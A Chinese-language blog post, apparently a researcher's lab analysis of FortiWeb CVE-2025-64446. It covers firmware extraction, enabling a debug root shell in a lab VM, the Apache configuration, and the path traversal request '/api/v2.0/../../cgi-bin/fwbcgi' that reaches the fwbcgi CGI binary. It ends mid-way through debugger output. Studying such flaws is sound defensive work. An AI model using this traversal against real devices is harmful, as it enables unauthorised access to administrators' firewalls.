<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="Based on 7.0.11 &amp; 7.0.12 文件系统123456789101112131415161718192021222324252627282930313233343536udo file -s &#x2F;dev&#x2F;sdb*[sudo] password for user: &#x2F;dev&#x2F;sdb:  DOS&#x2F;MBR boot sector; partition 1 : ID&#x3D;0x83, ac">
<meta property="og:type" content="article">
<meta property="og:title" content="FortiWeb CVE-2025-64446漏洞分析">
<meta property="og:url" content="http://example.com/2025/11/25/FortiWeb-CVE-2025-64446%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/index.html">
<meta property="og:site_name" content="SquareR">
<meta property="og:description" content="Based on 7.0.11 &amp; 7.0.12 文件系统123456789101112131415161718192021222324252627282930313233343536udo file -s &#x2F;dev&#x2F;sdb*[sudo] password for user: &#x2F;dev&#x2F;sdb:  DOS&#x2F;MBR boot sector; partition 1 : ID&#x3D;0x83, ac">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://raw.githubusercontent.com/squarepants0/Blog-Pics/master/Pasted%20image%2020251120155408.png">
<meta property="og:image" content="https://raw.githubusercontent.com/squarepants0/Blog-Pics/master/Pasted%20image%2020251120162607.png">
<meta property="og:image" content="https://raw.githubusercontent.com/squarepants0/Blog-Pics/master/Pasted%20image%2020251121104253.png">
<meta property="og:image" content="https://raw.githubusercontent.com/squarepants0/Blog-Pics/master/Pasted%20image%2020251124113047.png">
<meta property="og:image" content="https://raw.githubusercontent.com/squarepants0/Blog-Pics/master/Pasted%20image%2020251124113105.png">
<meta property="og:image" content="https://raw.githubusercontent.com/squarepants0/Blog-Pics/master/Pasted%20image%2020251125142508.png">
<meta property="og:image" content="https://raw.githubusercontent.com/squarepants0/Blog-Pics/master/Pasted%20image%2020251125143311.png">
<meta property="og:image" content="https://raw.githubusercontent.com/squarepants0/Blog-Pics/master/Pasted%20image%2020251125144205.png">
<meta property="article:published_time" content="2025-11-25T08:13:17.000Z">
<meta property="article:modified_time" content="2025-11-25T08:13:51.536Z">
<meta property="article:author" content="SquareR">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://raw.githubusercontent.com/squarepants0/Blog-Pics/master/Pasted%20image%2020251120155408.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>FortiWeb CVE-2025-64446漏洞分析</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 8.0.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/squarepants0">Projects</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        
        <li><a class="icon" aria-label="Next post" href="/2025/10/10/Citrix-Ptrace%E9%97%AE%E9%A2%98/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/11/25/FortiWeb-CVE-2025-64446%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/11/25/FortiWeb-CVE-2025-64446%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&text=FortiWeb CVE-2025-64446漏洞分析"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/11/25/FortiWeb-CVE-2025-64446%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=FortiWeb CVE-2025-64446漏洞分析"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/11/25/FortiWeb-CVE-2025-64446%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&is_video=false&description=FortiWeb CVE-2025-64446漏洞分析"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=FortiWeb CVE-2025-64446漏洞分析&body=Check out this article: http://example.com/2025/11/25/FortiWeb-CVE-2025-64446%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/11/25/FortiWeb-CVE-2025-64446%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=FortiWeb CVE-2025-64446漏洞分析"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/11/25/FortiWeb-CVE-2025-64446%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=FortiWeb CVE-2025-64446漏洞分析"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/11/25/FortiWeb-CVE-2025-64446%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=FortiWeb CVE-2025-64446漏洞分析"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/11/25/FortiWeb-CVE-2025-64446%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=FortiWeb CVE-2025-64446漏洞分析"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/11/25/FortiWeb-CVE-2025-64446%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&name=FortiWeb CVE-2025-64446漏洞分析&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/11/25/FortiWeb-CVE-2025-64446%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&t=FortiWeb CVE-2025-64446漏洞分析"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F"><span class="toc-number">1.</span> <span class="toc-text">文件系统</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1"><span class="toc-number">2.</span> <span class="toc-text">服务</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CVE-2025-64446"><span class="toc-number">3.</span> <span class="toc-text">CVE-2025-64446</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Patch"><span class="toc-number">3.1.</span> <span class="toc-text">Patch</span></a></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        FortiWeb CVE-2025-64446漏洞分析
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">SquareR</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2025-11-25T08:13:17.000Z" class="dt-published" itemprop="datePublished">2025-11-25</time>
        
      
    </div>


      

      

    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <p>Based on <code>7.0.11</code> &amp; <code>7.0.12</code></p>
<h1 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">udo file -s /dev/sdb*</span><br><span class="line">[<span class="built_in">sudo</span>] password <span class="keyword">for</span> user: </span><br><span class="line">/dev/sdb:  DOS/MBR boot sector; partition 1 : ID=0x83, active, start-CHS (0x0,0,0), end-CHS (0x0,0,0), startsector 12194, 800000 sectors; partition 2 : ID=0x83, start-CHS (0x0,0,0), end-CHS (0x0,0,0), startsector 812194, 800000 sectors; partition 3 : ID=0x83, start-CHS (0x0,0,0), end-CHS (0x0,0,0), startsector 1612194, 200000 sectors; partition 4 : ID=0x83, start-CHS (0x0,0,0), end-CHS (0x0,0,0), startsector 1812194, 65296670 sectors</span><br><span class="line">/dev/sdb1: DOS/MBR boot sector</span><br><span class="line">/dev/sdb2: data</span><br><span class="line">/dev/sdb3: Linux rev 1.0 ext3 filesystem data, UUID=8c4d311d-58e4-475a-bdde-b32da9cf668c (large files)</span><br><span class="line">/dev/sdb4: Linux rev 1.0 ext4 filesystem data, UUID=e2db5aaa-d698-4873-8a98-bbb6e3c5b961, volume name <span class="string">&quot;FWB_LOGDISK&quot;</span> (extents) (64bit) (large files) (huge files)</span><br><span class="line"></span><br><span class="line"><span class="built_in">sudo</span> mount -o ro,loop /dev/sdb1 /mnt</span><br><span class="line">➜ <span class="built_in">ls</span> /mnt </span><br><span class="line">backup_config_file  config  extlinux.conf  ldlinux.c32  lib         rootfs.gz      var      vmlinuz.chk</span><br><span class="line">bin                 etc     krootfs.gz     ldlinux.sys  lost+found  rootfs.gz.chk  vmlinuz  vmlinuz.kdump</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">sudo</span> mount -o ro,loop /dev/sdb4 /mnt                     </span><br><span class="line">➜ <span class="built_in">ls</span> /mnt</span><br><span class="line">apache_logs      dbg_cli.log         gui_upload            maxminddb          proxyd_statistic.db  upd_dir</span><br><span class="line">api              debug               hasync                messages           redis                upd-log</span><br><span class="line">botd             dlog_indexd         hcdb.dat              ml-backup          Reports_adom         url_record.db</span><br><span class="line">bot_management   dlog_logd           irdb_sig.db           ml-backup-api      scanner_integration  vir</span><br><span class="line">clustering.log   dmesg               known_engines_adom    ml-backup-bot      shell_accessd_log    virext</span><br><span class="line">cmdb             fds-fpm             lib                   mysql              shibboleth           wad</span><br><span class="line">cmdb.log         filebeat            libav.so              mysqld_monitor.sh  sig-func             wassd_debug_log</span><br><span class="line">cmdb_refcnt      filebeat_registry   log_global_manage.db  nic_affinity_log   statistic_adom       wvs</span><br><span class="line">cmdb_refcnt.log  fwlog               logo                  openapi            tmprpts_adom</span><br><span class="line">dbg_acmed.log    garbage_access.log  lost+found            outgoing           update_history.db</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">xz -d -k -f -c ./rootfs.gz &gt; rootfs.bin</span><br><span class="line"><span class="built_in">sudo</span> mount -o ro,loop rootfs.bin /mnt</span><br><span class="line"><span class="built_in">ls</span> /mnt    </span><br><span class="line">bin  data  dev  etc  home  lib  lib64  migadmin  mnt  modules  proc  script  share  sys  tmp  usr  var  VERSION</span><br><span class="line"><span class="built_in">cat</span> /mnt/VERSION                            </span><br><span class="line">7.0.11-B0181</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><em><strong>Root Shell</strong></em><br><img src="https://raw.githubusercontent.com/squarepants0/Blog-Pics/master/Pasted%20image%2020251120155408.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">config system global</span><br><span class="line"></span><br><span class="line">    set shell-access enable</span><br><span class="line"></span><br><span class="line">    set shell-username testadmin</span><br><span class="line"></span><br><span class="line">    set shell-password passforadmin</span><br><span class="line"></span><br><span class="line">    set shell-timeout 1200 --&gt; The shell-access will be disabled in 1200 minutes.</span><br><span class="line"></span><br><span class="line">    set shell-history-size 1024 --&gt; Record 1024 operations.</span><br><span class="line"></span><br><span class="line">    set shell-trusthostv4 0.0.0.0/0 --&gt; Source ip (ipv4) should in the trust-host address.</span><br><span class="line"></span><br><span class="line">    set shell-trusthostv6 ::/0 --&gt; Source ip (ipv6) should in the trust-host address.</span><br><span class="line"></span><br><span class="line">end</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>然后使用这个账号登录即可：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">ssh debug@192.168.139.135</span><br><span class="line">The authenticity of host <span class="string">&#x27;192.168.139.135 (192.168.139.135)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ED25519 key fingerprint is SHA256:sOFOLiOCYxDuyr2nRQz/wtps/Q/p/tb2q11TNBJJHqM.</span></span><br><span class="line"><span class="string">This key is not known by any other names.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>192.168.139.135<span class="string">&#x27; (ED25519) to the list of known hosts.</span></span><br><span class="line"><span class="string">debug@192.168.139.135&#x27;</span>s password:</span><br><span class="line">-- WARNING! All configurations should be <span class="keyword">done</span> through CLI shell.</span><br><span class="line">-- You now have full access.</span><br><span class="line">/# <span class="built_in">ls</span></span><br><span class="line">VERSION   data      etc       lib       migadmin  modules   script    sys       usr</span><br><span class="line">bin       dev       home      lib64     mnt       proc      share     tmp       var</span><br><span class="line">/#</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>或者：<br><img src="https://raw.githubusercontent.com/squarepants0/Blog-Pics/master/Pasted%20image%2020251120162607.png"></p>
<h1 id="服务"><a href="#服务" class="headerlink" title="服务"></a>服务</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -T4 -p- 192.168.139.135                      </span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2025-11-20 16:31 HKT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.139.135</span><br><span class="line">Host is up (0.0011s latency).</span><br><span class="line">Not shown: 65528 closed ports</span><br><span class="line">PORT    STATE    SERVICE</span><br><span class="line">8/tcp   filtered unknown</span><br><span class="line">9/tcp   filtered discard</span><br><span class="line">22/tcp  open     ssh</span><br><span class="line">43/tcp  filtered whois</span><br><span class="line">80/tcp  open     http</span><br><span class="line">443/tcp open     https</span><br><span class="line">995/tcp open     pop3s</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p><em><strong>httpsd</strong></em></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">/# /bin/httpsd -V</span><br><span class="line">Server version: xxxxxxx/2.4.53 (Unix)</span><br><span class="line">Server built:   Mar 26 2025 18:38:56</span><br><span class="line">Server<span class="string">&#x27;s Module Magic Number: 20120211:124</span></span><br><span class="line"><span class="string">Server loaded:  APR 1.5.1, APR-UTIL 1.5.3, PCRE 8.43 2019-02-23</span></span><br><span class="line"><span class="string">Compiled using: APR 1.4.6, APR-UTIL 1.4.1, PCRE 8.43 2019-02-23</span></span><br><span class="line"><span class="string">Architecture:   64-bit</span></span><br><span class="line"><span class="string">Server MPM:     prefork</span></span><br><span class="line"><span class="string">  threaded:     no</span></span><br><span class="line"><span class="string">    forked:     yes (variable process count)</span></span><br><span class="line"><span class="string">Server compiled with....</span></span><br><span class="line"><span class="string"> -D BIG_SECURITY_HOLE</span></span><br><span class="line"><span class="string"> -D APR_HAS_SENDFILE</span></span><br><span class="line"><span class="string"> -D APR_HAS_MMAP</span></span><br><span class="line"><span class="string"> -D APR_HAVE_IPV6 (IPv4-mapped addresses enabled)</span></span><br><span class="line"><span class="string"> -D APR_USE_SYSVSEM_SERIALIZE</span></span><br><span class="line"><span class="string"> -D APR_USE_PTHREAD_SERIALIZE</span></span><br><span class="line"><span class="string"> -D SINGLE_LISTEN_UNSERIALIZED_ACCEPT</span></span><br><span class="line"><span class="string"> -D APR_HAS_OTHER_CHILD</span></span><br><span class="line"><span class="string"> -D AP_HAVE_RELIABLE_PIPED_LOGS</span></span><br><span class="line"><span class="string"> -D DYNAMIC_MODULE_LIMIT=256</span></span><br><span class="line"><span class="string"> -D HTTPD_ROOT=&quot;/migadmin&quot;</span></span><br><span class="line"><span class="string"> -D SUEXEC_BIN=&quot;/migadmin/bin/suexec&quot;</span></span><br><span class="line"><span class="string"> -D DEFAULT_PIDLOG=&quot;/var/run/httpsd.pid&quot;</span></span><br><span class="line"><span class="string"> -D DEFAULT_SCOREBOARD=&quot;/var/run/apache_runtime_status&quot;</span></span><br><span class="line"><span class="string"> -D DEFAULT_ERRORLOG=&quot;logs/error_log&quot;</span></span><br><span class="line"><span class="string"> -D AP_TYPES_CONFIG_FILE=&quot;conf/mime.types&quot;</span></span><br><span class="line"><span class="string"> -D SERVER_CONFIG_FILE=&quot;conf/httpd.conf&quot;</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>


<p>涉及到漏洞的配置文件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;Location /api/v2.0/&gt;</span><br><span class="line"></span><br><span class="line">    SetHandler fwbcgi-handler</span><br><span class="line"></span><br><span class="line">&lt;/Location&gt;</span><br></pre></td></tr></table></figure>
<p>这个模块是httpd的静态模块，也就是编译到二进制文件中了：<br><img src="https://raw.githubusercontent.com/squarepants0/Blog-Pics/master/Pasted%20image%2020251121104253.png"></p>
<h1 id="CVE-2025-64446"><a href="#CVE-2025-64446" class="headerlink" title="CVE-2025-64446"></a>CVE-2025-64446</h1><p>请求路径 <strong>&#x2F;api&#x2F;v2.0&#x2F;..&#x2F;..&#x2F;cgi-bin&#x2F;fwbcgi</strong> 包含路径遍历序列 ..&#x2F;..，试图从&#x2F;api&#x2F;v2.0&#x2F;向上跳转两级目录，到达&#x2F;cgi-bin&#x2F;fwbcgi，Apache 会在处理请求前对路径进行规范化处理，将 &#x2F;api&#x2F;v2.0&#x2F;..&#x2F;..&#x2F;cgi-bin&#x2F;fwbcgi 规范化为&#x2F;cgi-bin&#x2F;fwbcgi。根据配置文件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;IfModule alias_module&gt;</span><br><span class="line">    ScriptAlias /cgi-bin/ &quot;/migadmin/cgi-bin/&quot;</span><br><span class="line">&lt;/IfModule&gt;</span><br><span class="line"></span><br><span class="line">&lt;Directory &quot;/migadmin/cgi-bin&quot;&gt;</span><br><span class="line">    Options +ExecCGI</span><br><span class="line">    SetHandler cgi-script</span><br><span class="line">&lt;/Directory&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>规范化后的路径 &#x2F;cgi-bin&#x2F;fwbcgi 会匹配 ScriptAlias &#x2F;cgi-bin&#x2F; 规则，该路径会被映射到物理路径 &#x2F;migadmin&#x2F;cgi-bin&#x2F;fwbcgi，该目录启用了 CGI 执行（Options +ExecCGI 和 SetHandler cgi-script）如果 fwbcgi 文件存在且可执行，请求会成功执行：</p>
<p><img src="https://raw.githubusercontent.com/squarepants0/Blog-Pics/master/Pasted%20image%2020251124113047.png"></p>
<p><img src="https://raw.githubusercontent.com/squarepants0/Blog-Pics/master/Pasted%20image%2020251124113105.png"></p>
<p>使用strace观察，两次请求其实都访问到了<code>fwbcgi</code>，所以根本没有经过fwbcgi-handler：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/tmp <span class="comment"># strace -ff -e trace=fork,execve -p 26730</span></span><br><span class="line">strace: Process 26730 attached</span><br><span class="line">strace: Process 26772 attached</span><br><span class="line">[pid 26772] execve(<span class="string">&quot;/migadmin/cgi-bin/fwbcgi&quot;</span>, [<span class="string">&quot;/cgi-bin/fwbcgi&quot;</span>, <span class="string">&quot;/migadmin/cgi-bin/fwbcgi&quot;</span>], 0xe02e08 /* 38 vars */) = 0</span><br><span class="line">[pid 26772] +++ exited with 0 +++</span><br><span class="line">strace: Process 28042 attached</span><br><span class="line">[pid 28042] execve(<span class="string">&quot;/migadmin/cgi-bin/fwbcgi&quot;</span>, [<span class="string">&quot;/cgi-bin/fwbcgi&quot;</span>, <span class="string">&quot;/migadmin/cgi-bin/fwbcgi&quot;</span>], 0xe02e08 /* 38 vars */) = 0</span><br><span class="line">[pid 28042] +++ exited with 0 +++</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>注意在调试http的这种模式的<code>fork + execve</code>的cgi调用时，设置gdb：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set follow-fork-mode child #跟随子进程</span><br><span class="line">set detach-on-fork off # fork 后不分离</span><br><span class="line">set schedule-multiple on        # 所有进程都运行，这样continue的时候都会运行，面对cgi需要从parent读取数据时很有效</span><br></pre></td></tr></table></figure>


<p>在调用<code>fwbcgi</code>时环境变量为：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">00:0000│ rsp 0x7ffe239fa9a0 ◂— 2</span><br><span class="line">01:0008│     0x7ffe239fa9a8 —▸ 0x7ffe239fcb3a ◂— <span class="string">&#x27;/cgi-bin/fwbcgi&#x27;</span></span><br><span class="line">02:0010│     0x7ffe239fa9b0 —▸ 0x7ffe239fcb4a ◂— <span class="string">&#x27;/migadmin/cgi-bin/fwbcgi&#x27;</span></span><br><span class="line">03:0018│     0x7ffe239fa9b8 ◂— 0</span><br><span class="line">04:0020│     0x7ffe239fa9c0 —▸ 0x7ffe239fcb63 ◂— <span class="string">&#x27;no_gzip=1&#x27;</span></span><br><span class="line">05:0028│     0x7ffe239fa9c8 —▸ 0x7ffe239fcb6d ◂— <span class="string">&#x27;HTTPS=on&#x27;</span></span><br><span class="line">06:0030│     0x7ffe239fa9d0 —▸ 0x7ffe239fcb76 ◂— <span class="string">&#x27;HTTP_HOST=192.168.139.147&#x27;</span></span><br><span class="line">07:0038│     0x7ffe239fa9d8 —▸ 0x7ffe239fcb90 ◂— <span class="string">&#x27;HTTP_SEC_CH_UA_PLATFORM=&quot;Windows&quot;&#x27;</span></span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► 0   0x7fc42a5a8090 None</span><br><span class="line">   1              0x2 None</span><br><span class="line">   2   0x7ffe239fcb3a None</span><br><span class="line">   3   0x7ffe239fcb4a None</span><br><span class="line">   4              0x0 None</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; stack</span><br><span class="line">00:0000│ rsp 0x7ffe239fa9a0 ◂— 2</span><br><span class="line">01:0008│     0x7ffe239fa9a8 —▸ 0x7ffe239fcb3a ◂— <span class="string">&#x27;/cgi-bin/fwbcgi&#x27;</span></span><br><span class="line">02:0010│     0x7ffe239fa9b0 —▸ 0x7ffe239fcb4a ◂— <span class="string">&#x27;/migadmin/cgi-bin/fwbcgi&#x27;</span></span><br><span class="line">03:0018│     0x7ffe239fa9b8 ◂— 0</span><br><span class="line">04:0020│     0x7ffe239fa9c0 —▸ 0x7ffe239fcb63 ◂— <span class="string">&#x27;no_gzip=1&#x27;</span></span><br><span 